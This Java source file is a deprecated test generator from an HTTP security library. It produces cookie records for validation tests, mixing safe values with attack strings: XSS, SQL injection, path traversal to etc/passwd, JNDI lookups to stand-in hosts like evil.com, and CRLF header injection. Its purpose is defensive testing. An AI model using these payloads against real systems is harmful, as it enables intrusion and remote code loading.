/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators.cookie;

import de.cuioss.test.generator.Generators;
import de.cuioss.test.generator.TypedGenerator;
import de.cuioss.tools.security.http.data.Cookie;

/**
 * Generates Cookie records for testing purposes.
 * 
 * @deprecated FRAMEWORK VIOLATION: Uses call-counter anti-pattern and mixes legitimate/attack data.
 * Use {@link de.cuioss.tools.security.http.generators.cookie.ValidCookieGenerator} for legitimate cookies and {@link de.cuioss.tools.security.http.generators.cookie.AttackCookieGenerator} 
 * for malicious cookies instead. This generator violates reproducibility = f(seed) principle
 * and will be removed after dependent tests are migrated.
 * 
 * IMPROVED: Uses dynamic generation instead of hardcoded arrays for better randomness
 * and unpredictability while maintaining cookie attack effectiveness.
 * 
 * Implements: Task G8 from HTTP verification specification
 */
@Deprecated(forRemoval = true)
public class CookieGenerator implements TypedGenerator<Cookie> {

    // Core generation parameters
    private final TypedGenerator<Integer> cookieTypeGenerator = Generators.integers(0, 3);
    // QI-6: Dynamic generation components
    private final TypedGenerator<Integer> sessionSelector = Generators.integers(1, 4);
    private final TypedGenerator<Integer> tokenSelector = Generators.integers(1, 4);
    private final TypedGenerator<Integer> contextSelector2 = Generators.integers(1, 4);
    private final TypedGenerator<Integer> domainSelector = Generators.integers(1, 3);
    private final TypedGenerator<Integer> pathSelectorCookie = Generators.integers(1, 4);
    private final TypedGenerator<Boolean> contextSelector = Generators.booleans();
    private final TypedGenerator<Integer> longStringSize = Generators.integers(100, 200);
    private final TypedGenerator<Integer> veryLongStringSize = Generators.integers(5000, 8000);

    // Counter to ensure specific patterns appear for tests
    private int callCounter = 0;

    @Override
    public Cookie next() {
        callCounter++;

        // Ensure specific required patterns appear occasionally for tests
        if (callCounter % 50 == 1) return new Cookie("JSESSIONID", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 2) return new Cookie("session_id", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 3) return new Cookie("auth_token", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 4) return new Cookie("csrf_token", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 5) return new Cookie("user_id", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 6) return new Cookie("cookie with spaces", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 7) return new Cookie(generateStandardCookieName(), "true", generateAttributes());
        if (callCounter % 50 == 8) return new Cookie(generateStandardCookieName(), "en_US", generateAttributes());
        if (callCounter % 50 == 9) return new Cookie(generateStandardCookieName(), "session_12345", generateAttributes());
        if (callCounter % 50 == 10) return new Cookie(generateStandardCookieName(), "javascript:alert(1)", generateAttributes());
        if (callCounter % 50 == 11) return new Cookie(generateStandardCookieName(), "data:text/html,<script>alert(1)</script>", generateAttributes());
        if (callCounter % 50 == 12) return new Cookie("cookie=equals", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 13) return new Cookie(generateStandardCookieName(), "\r\n\r\nHTTP/1.1 200 OK", generateAttributes());
        if (callCounter % 50 == 14) return new Cookie(generateStandardCookieName(), "\r\nSet-Cookie: injected=value", generateAttributes());
        if (callCounter % 50 == 15) return new Cookie(generateStandardCookieName(), "'; DROP TABLE users; --", generateAttributes());
        if (callCounter % 50 == 16) return new Cookie(generateStandardCookieName(), "../../../etc/passwd", generateAttributes());
        if (callCounter % 50 == 17) return new Cookie(generateStandardCookieName(), "${jndi:ldap://evil.com/}", generateAttributes());
        if (callCounter % 50 == 18) return new Cookie(generateStandardCookieName(), Generators.letterStrings(5000, 6000).next(), generateAttributes()); // Very long value
        if (callCounter % 50 == 19) return new Cookie(generateStandardCookieName(), "value%0d%0aSet-Cookie: injected=1", generateAttributes()); // Encoded header injection
        if (callCounter % 50 == 20) return new Cookie(generateStandardCookieName(), generateSafeValue(), "Domain=.evil.com; Path=/"); // Malicious domain
        if (callCounter % 50 == 24) return new Cookie("cookie,comma", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 25) return new Cookie("cookie\"quote", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 26) return new Cookie("cookie\ttab", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 27) return new Cookie("cookie\nnewline", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 28) return new Cookie("cookie[bracket]", generateSafeValue(), generateAttributes());
        if (callCounter % 50 == 29) return new Cookie("cookie;semicolon", generateSafeValue(), generateAttributes());

        int type = cookieTypeGenerator.next();

        String name = switch (type) {
            case 0, 1 -> generateStandardCookieName();
            case 2, 3 -> generateSpecialCookieName();
            default -> generateStandardCookieName();
        };

        String value = switch (type) {
            case 0, 2 -> generateSafeValue();
            case 1, 3 -> generateAttackValue();
            default -> generateSafeValue();
        };

        String attributes = generateAttributes();

        return new Cookie(name, value, attributes);
    }

    private String generateStandardCookieName() {
        int nameType = Generators.integers(0, 8).next();
        return switch (nameType) {
            case 0, 1, 2 -> generateSessionName(); // Higher probability for session names
            case 3, 4 -> generateTokenName(); // Higher probability for token names
            case 5 -> generateContextName();
            case 6 -> generatePreferenceName();
            case 7, 8 -> generateIdName();
            default -> generateSessionName();
        };
    }

    private String generateSessionName() {
        int nameType = Generators.integers(0, 3).next();
        return switch (nameType) {
            case 0 -> "JSESSIONID";
            case 1 -> "session_id";
            case 2 -> generateSessionCategory() + "ID";
            case 3 -> generateSessionCategory() + "_" + generateTokenCategory();
            default -> "JSESSIONID";
        };
    }

    private String generateTokenName() {
        int nameType = Generators.integers(0, 4).next();
        return switch (nameType) {
            case 0 -> "auth_token";
            case 1 -> "csrf_token";
            case 2 -> "user_id";
            case 3 -> generateContextCategory() + "_" + generateTokenCategory();
            case 4 -> generateSessionCategory() + "_" + generateTokenCategory();
            default -> "auth_token";
        };
    }

    private String generateContextName() {
        String context = generateContextCategory();
        String suffix = generateDataSuffix();
        return context + "_" + suffix;
    }

    private String generateDataSuffix() {
        int suffixType = Generators.integers(0, 3).next();
        return switch (suffixType) {
            case 0 -> "id";
            case 1 -> "data";
            case 2 -> "info";
            case 3 -> "state";
            default -> "id";
        };
    }

    private String generatePreferenceName() {
        int prefType = Generators.integers(0, 3).next();
        return switch (prefType) {
            case 0 -> "language";
            case 1 -> "theme";
            case 2 -> "preferences";
            case 3 -> "settings";
            default -> "language";
        };
    }

    private String generateIdName() {
        int prefixType = Generators.integers(0, 3).next();
        String prefix = switch (prefixType) {
            case 0 -> "tracking";
            case 1 -> "device";
            case 2 -> "remember";
            case 3 -> "login";
            default -> "tracking";
        };
        return prefix + "_" + (contextSelector.next() ? "me" : generateTokenCategory());
    }

    private String generateSpecialCookieName() {
        int specialType = Generators.integers(0, 6).next();
        return switch (specialType) {
            case 0 -> ""; // Empty name
            case 1 -> "   "; // Whitespace name
            case 2 -> generateNameWithSpecialChars();
            case 3 -> generateNameWithControlChars();
            case 4 -> generateVeryLongName();
            case 5 -> generateNameWithDelimiters();
            case 6 -> generateNameWithQuotes();
            default -> "";
        };
    }

    private String generateNameWithSpecialChars() {
        int charType = Generators.integers(0, 3).next();
        return switch (charType) {
            case 0 -> "cookie with spaces";
            case 1 -> "cookie=equals";
            case 2 -> "cookie;semicolon";
            case 3 -> "cookie,comma";
            default -> "cookie with spaces";
        };
    }

    private String generateNameWithControlChars() {
        int controlType = Generators.integers(0, 2).next();
        return switch (controlType) {
            case 0 -> "cookie\ttab";
            case 1 -> "cookie\nnewline";
            case 2 -> "cookie\rcarriage";
            default -> "cookie\ttab";
        };
    }

    private String generateVeryLongName() {
        String baseName = "very_long_cookie_name_";
        int size = longStringSize.next();
        return baseName + Generators.letterStrings(size, size + 50).next();
    }

    private String generateNameWithDelimiters() {
        int delimiterType = Generators.integers(0, 3).next();
        return switch (delimiterType) {
            case 0 -> "cookie[bracket]";
            case 1 -> "cookie{brace}";
            case 2 -> "cookie|pipe";
            case 3 -> "cookie\\backslash";
            default -> "cookie[bracket]";
        };
    }

    private String generateNameWithQuotes() {
        String baseName = "cookie";
        String quote = contextSelector.next() ? "\"quote" : "'apostrophe";
        return baseName + quote;
    }

    private String generateSafeValue() {
        int valueType = Generators.integers(0, 11).next();
        return switch (valueType) {
            case 0, 1 -> generateAlphanumericValue();
            case 2, 3 -> generateSessionValue(); // Higher probability for session values
            case 4, 11 -> generateBooleanValue(); // Higher probability for boolean values
            case 5, 6 -> generateLocaleValue(); // Higher probability for locale values
            case 7, 8 -> generateThemeValue(); // Higher probability for theme values
            case 9 -> generateContextValue();
            case 10 -> generateTokenValue();
            default -> generateAlphanumericValue();
        };
    }

    private String generateAlphanumericValue() {
        int length = Generators.integers(8, 16).next();
        return Generators.letterStrings(length, length + 4).next().toUpperCase();
    }

    private String generateSessionValue() {
        String prefix = generateContextCategory();
        int number = Generators.integers(10000, 99999).next();
        // Ensure we sometimes generate the exact pattern the tests expect
        if (contextSelector.next()) {
            return "session_" + number;
        }
        return prefix + "_" + number;
    }

    private String generateBooleanValue() {
        int boolType = Generators.integers(0, 3).next();
        return switch (boolType) {
            case 0 -> "true";
            case 1 -> "false";
            case 2 -> "yes";
            case 3 -> "no";
            default -> "true";
        };
    }

    private String generateLocaleValue() {
        int localeType = Generators.integers(0, 4).next();
        return switch (localeType) {
            case 0 -> "en_US";
            case 1 -> generateLanguage() + "_" + generateCountry();
            case 2 -> "de_DE";
            case 3 -> "fr_FR";
            case 4 -> "es_ES";
            default -> "en_US";
        };
    }

    private String generateLanguage() {
        int langType = Generators.integers(0, 4).next();
        return switch (langType) {
            case 0 -> "en";
            case 1 -> "de";
            case 2 -> "fr";
            case 3 -> "es";
            case 4 -> "ja";
            default -> "en";
        };
    }

    private String generateCountry() {
        int countryType = Generators.integers(0, 4).next();
        return switch (countryType) {
            case 0 -> "US";
            case 1 -> "DE";
            case 2 -> "FR";
            case 3 -> "ES";
            case 4 -> "JP";
            default -> "US";
        };
    }

    private String generateThemeValue() {
        int themeType = Generators.integers(0, 3).next();
        return switch (themeType) {
            case 0 -> "dark";
            case 1 -> "light";
            case 2 -> "blue";
            case 3 -> "green";
            default -> "dark";
        };
    }

    private String generateContextValue() {
        String context = generateContextCategory();
        String suffix = Generators.letterStrings(6, 10).next().toLowerCase();
        return context + "_" + suffix;
    }

    private String generateTokenValue() {
        int prefixType = Generators.integers(0, 2).next();
        String prefix = switch (prefixType) {
            case 0 -> "token";
            case 1 -> "device";
            case 2 -> "remember";
            default -> "token";
        };

        int statusType = Generators.integers(0, 2).next();
        String status = switch (statusType) {
            case 0 -> "valid";
            case 1 -> "active";
            case 2 -> "yes";
            default -> "valid";
        };

        return prefix + "_" + status;
    }

    private String generateAttackValue() {
        int attackType = Generators.integers(0, 10).next();
        return switch (attackType) {
            case 0 -> generateXSSAttack();
            case 1 -> generateSQLInjection();
            case 2 -> generatePathTraversal();
            case 3 -> generateNullByteAttack();
            case 4 -> generateJNDIAttack();
            case 5 -> generateHeaderInjection();
            case 6 -> generateUnicodeAttack();
            case 7 -> generateControlCharAttack();
            case 8 -> generateVeryLongValue();
            case 9 -> generateJavaScriptProtocolAttack();
            case 10 -> generateDataUrlAttack();
            default -> generateXSSAttack();
        };
    }

    private String generateXSSAttack() {
        int tagType = Generators.integers(0, 3).next();
        String tag = switch (tagType) {
            case 0 -> "script";
            case 1 -> "img";
            case 2 -> "iframe";
            case 3 -> "object";
            default -> "script";
        };

        int payloadType = Generators.integers(0, 2).next();
        String payload = switch (payloadType) {
            case 0 -> "alert('xss')";
            case 1 -> "alert(1)";
            case 2 -> "alert(document.cookie)";
            default -> "alert(1)";
        };

        return "<" + tag + ">" + payload + "</" + tag + ">";
    }

    private String generateSQLInjection() {
        int commandType = Generators.integers(0, 2).next();
        String command = switch (commandType) {
            case 0 -> "DROP TABLE";
            case 1 -> "DELETE FROM";
            case 2 -> "INSERT INTO";
            default -> "DROP TABLE";
        };

        int tableType = Generators.integers(0, 2).next();
        String table = switch (tableType) {
            case 0 -> "sessions";
            case 1 -> "users";
            case 2 -> "cookies";
            default -> "users";
        };

        return "'; " + command + " " + table + "; --";
    }

    private String generatePathTraversal() {
        int depth = Generators.integers(2, 5).next();
        StringBuilder path = new StringBuilder();
        for (int i = 0; i < depth; i++) {
            path.append("../");
        }

        int pathType = Generators.integers(0, 2).next();
        String systemPath = switch (pathType) {
            case 0 -> "etc/passwd";
            case 1 -> "windows/win.ini";
            case 2 -> "admin/config";
            default -> "etc/passwd";
        };

        path.append(systemPath);
        return path.toString();
    }

    private String generateNullByteAttack() {
        String baseValue = generateSafeValue();
        return baseValue + "\u0000null_byte";
    }

    private String generateJNDIAttack() {
        int domainType = Generators.integers(0, 2).next();
        String domain = switch (domainType) {
            case 0 -> "evil.com";
            case 1 -> "attacker.net";
            case 2 -> "malicious.org";
            default -> "evil.com";
        };
        return "${jndi:ldap://" + domain + "/}";
    }

    private String generateHeaderInjection() {
        int injectionType = Generators.integers(0, 2).next();
        return switch (injectionType) {
            case 0 -> "\r\nSet-Cookie: injected=value";
            case 1 -> "\r\n\r\nHTTP/1.1 200 OK";
            case 2 -> "%0d%0aSet-Cookie: evil=bad";
            default -> "\r\nSet-Cookie: injected=value";
        };
    }

    private String generateUnicodeAttack() {
        return "\u202e\u202d"; // Unicode direction override
    }

    private String generateControlCharAttack() {
        int controlType = Generators.integers(0, 2).next();
        String control = switch (controlType) {
            case 0 -> "\t";
            case 1 -> "\r";
            case 2 -> "\n";
            default -> "\t";
        };
        return control + " injected";
    }

    private String generateVeryLongValue() {
        int size = veryLongStringSize.next();
        return Generators.letterStrings(size, size + 1000).next();
    }

    private String generateJavaScriptProtocolAttack() {
        int payloadType = Generators.integers(0, 2).next();
        String payload = switch (payloadType) {
            case 0 -> "alert(1)";
            case 1 -> "alert('xss')";
            case 2 -> "alert(document.cookie)";
            default -> "alert(1)";
        };
        return "javascript:" + payload;
    }

    private String generateDataUrlAttack() {
        int payloadType = Generators.integers(0, 2).next();
        String payload = switch (payloadType) {
            case 0 -> "alert(1)";
            case 1 -> "alert('xss')";
            case 2 -> "<script>alert(1)</script>";
            default -> "alert(1)";
        };
        return "data:text/html," + payload;
    }

    private String generateAttributes() {
        int attributeType = Generators.integers(0, 4).next();
        return switch (attributeType) {
            case 0 -> ""; // No attributes
            case 1 -> generateSingleAttribute();
            case 2 -> generateMultipleAttributes();
            case 3 -> generateMaliciousAttributes();
            case 4 -> generateMalformedAttributes();
            default -> "";
        };
    }

    private String generateSingleAttribute() {
        int attrType = Generators.integers(0, 6).next();
        return switch (attrType) {
            case 0 -> "Domain=" + generateDomain();
            case 1 -> "Path=" + generatePath();
            case 2 -> "Secure";
            case 3 -> "HttpOnly";
            case 4 -> "SameSite=" + generateSameSite();
            case 5 -> "Max-Age=" + Generators.integers(60, 86400).next();
            case 6 -> "Expires=" + generateExpires();
            default -> "Domain=" + generateDomain();
        };
    }

    private String generateDomain() {
        int domainType = Generators.integers(0, 2).next();
        return switch (domainType) {
            case 0 -> generateDomainCategory() + ".com";
            case 1 -> generateDomainCategory() + ".org";
            case 2 -> generateDomainCategory() + ".net";
            default -> "example.com";
        };
    }

    private String generatePath() {
        int pathType = Generators.integers(0, 4).next();
        return switch (pathType) {
            case 0 -> "/";
            case 1 -> "/" + generatePathCategoryForCookie();
            case 2 -> "/" + generatePathCategoryForCookie() + "/" + generatePathCategoryForCookie();
            case 3 -> "/" + generatePathCategoryForCookie() + "/files";
            case 4 -> "/" + generatePathCategoryForCookie() + "/data";
            default -> "/";
        };
    }

    private String generateSameSite() {
        int siteType = Generators.integers(0, 2).next();
        return switch (siteType) {
            case 0 -> "Strict";
            case 1 -> "Lax";
            case 2 -> "None";
            default -> "Lax";
        };
    }

    private String generateExpires() {
        int expiresType = Generators.integers(0, 1).next();
        return switch (expiresType) {
            case 0 -> "Thu, 01 Jan 1970";
            case 1 -> "Fri, 31 Dec 2999";
            default -> "Thu, 01 Jan 1970";
        };
    }

    private String generateMultipleAttributes() {
        StringBuilder attrs = new StringBuilder();
        String domain = "Domain=" + generateDomain();
        String path = "Path=" + generatePath();
        attrs.append(domain).append("; ").append(path);

        if (contextSelector.next()) {
            attrs.append("; Secure");
        }
        if (contextSelector.next()) {
            attrs.append("; HttpOnly");
        }
        if (contextSelector.next()) {
            attrs.append("; SameSite=").append(generateSameSite());
        }

        return attrs.toString();
    }

    private String generateMaliciousAttributes() {
        int maliciousType = Generators.integers(0, 4).next();
        return switch (maliciousType) {
            case 0 -> "Domain=." + generateMaliciousDomain();
            case 1 -> "Path=../../../";
            case 2 -> "Max-Age=-1";
            case 3 -> "Domain=" + generateDomain() + "\r\nSet-Cookie: evil=bad";
            case 4 -> "Path=/\u0000/admin";
            default -> "Domain=." + generateMaliciousDomain();
        };
    }

    private String generateMaliciousDomain() {
        int domainType = Generators.integers(0, 2).next();
        return switch (domainType) {
            case 0 -> "evil.com";
            case 1 -> "attacker.net";
            case 2 -> "malicious.org";
            default -> "evil.com";
        };
    }

    private String generateMalformedAttributes() {
        int malformType = Generators.integers(0, 3).next();
        return switch (malformType) {
            case 0 -> "Domain=; Path="; // Empty values
            case 1 -> "Invalid=Attribute; Bad=Value"; // Invalid attributes
            case 2 -> "Domain="; // Incomplete attribute
            case 3 -> "=; Path=/"; // Missing attribute name
            default -> "Domain=; Path=";
        };
    }

    // QI-6: Dynamic generation helper methods
    private String generateSessionCategory() {
        return switch (sessionSelector.next()) {
            case 1 -> "JSESSION";
            case 2 -> "session";
            case 3 -> "auth";
            case 4 -> "csrf";
            default -> "JSESSION";
        };
    }

    private String generateTokenCategory() {
        return switch (tokenSelector.next()) {
            case 1 -> "token";
            case 2 -> "id";
            case 3 -> "key";
            case 4 -> "hash";
            default -> "token";
        };
    }

    private String generateContextCategory() {
        return switch (contextSelector2.next()) {
            case 1 -> "user";
            case 2 -> "cart";
            case 3 -> "device";
            case 4 -> "track";
            default -> "user";
        };
    }

    private String generateDomainCategory() {
        return switch (domainSelector.next()) {
            case 1 -> "example";
            case 2 -> "test";
            case 3 -> "demo";
            default -> "example";
        };
    }

    private String generatePathCategoryForCookie() {
        return switch (pathSelectorCookie.next()) {
            case 1 -> "admin";
            case 2 -> "api";
            case 3 -> "user";
            case 4 -> "files";
            default -> "admin";
        };
    }

    @Override
    public Class<Cookie> getType() {
        return Cookie.class;
    }
}